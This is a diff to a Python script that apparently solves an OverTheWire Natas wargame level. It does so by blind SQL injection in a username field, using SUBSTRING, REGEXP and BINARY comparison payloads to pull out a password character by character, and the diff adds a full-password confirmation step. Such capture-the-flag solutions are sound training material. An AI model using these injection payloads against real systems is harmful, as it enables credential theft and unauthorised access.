@@ -60,7 +60,7 @@ def char_is_alpha(pos: int, credentials: tuple[str, str]) -> bool:
     Raises RuntimeError if the response is unexpected.
     """
     payload = {
-        'username': f'natas16" AND SUBSTRING(password, {pos}, 1) REGEXP "[a-zA-Z]'
+        'username': f'{LEVEL_NEXT}" AND SUBSTRING(password, {pos}, 1) REGEXP "[a-zA-Z]'
     }
 
     response_text = send_post_request(payload, credentials)
@@ -74,7 +74,7 @@ def password_char_greater_than(pos: int, char: str, credentials: tuple[str, str]
     Raises RuntimeError if the response is unexpected.
     """
     payload = {
-        'username': f'natas16" AND SUBSTRING(password, {pos}, 1) > "{char}'
+        'username': f'{LEVEL_NEXT}" AND SUBSTRING(password, {pos}, 1) > "{char}'
     }
 
     response_text = send_post_request(payload, credentials)
@@ -88,7 +88,21 @@ def confirm_char(pos: int, char: str, credentials: tuple[str, str]) -> bool:
     Raises RuntimeError if the response is unexpected.
     """
     payload = {
-        'username': f'natas16" AND BINARY SUBSTRING(password, {pos}, 1) = "{char}'
+        'username': f'{LEVEL_NEXT}" AND BINARY SUBSTRING(password, {pos}, 1) = "{char}'
+    }
+
+    response_text = send_post_request(payload, credentials)
+
+    return response_indicates_success(response_text)
+
+def confirm_password(password: str, credentials: tuple[str, str]) -> bool:
+    """
+    Confirms the full password by checking equality in one request.
+    Returns True if confirmed, False if not.
+    Raises RuntimeError if the response is unexpected.
+    """
+    payload = {
+        'username': f'{LEVEL_NEXT}" AND BINARY password = "{password}'
     }
 
     response_text = send_post_request(payload, credentials)
@@ -147,7 +161,17 @@ def main():
             print(f"Runtime error: {e}")
             return
 
-    print(f"Password successfully recovered: {password}")
+    print(f"Candidate password: {password}")
+    print("Verifying full password...")
+
+    try:
+        if confirm_password(password, credentials):
+            print(f"Password confirmed: {password}")
+        else:
+            print(f"Final confirmation failed. Password may be incorrect.")
+    except RuntimeError as e:
+        print(f"Runtime error: {e}")
+
     print(f"Total HTTP requests: {http_request_count}")
 
 if __name__ == '__main__':
